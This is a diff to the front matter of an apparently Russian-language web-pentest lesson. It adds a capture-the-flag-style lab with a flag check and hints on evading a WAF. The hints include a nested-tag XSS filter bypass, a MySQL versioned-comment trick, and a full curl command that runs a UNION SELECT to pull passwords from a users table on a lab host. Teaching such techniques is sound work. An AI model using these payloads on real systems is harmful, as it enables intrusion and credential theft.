@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 8
 summary: "Экспертный уровень: обход WAF/фильтров и построение цепочек атак из нескольких уязвимостей."
+lab:
+  kind: shell
+  title: 'Практика: обход WAF и цепочка инъекций'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Фильтр вырезает по шаблону: `<scr<script>ipt>` после вырезания даёт рабочий `<script>`.'
+    - 'WAF и приложение парсят запрос по-разному — используй расхождение парсеров.'
+    - 'MySQL-комментарий `/*!50000...*/` WAF видит как комментарий, а БД исполняет содержимое.'
+    - 'Запусти: `curl -s ''https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users'' | tail -1 > found.txt`, затем `check`.'
 ---
 
 ## Задача
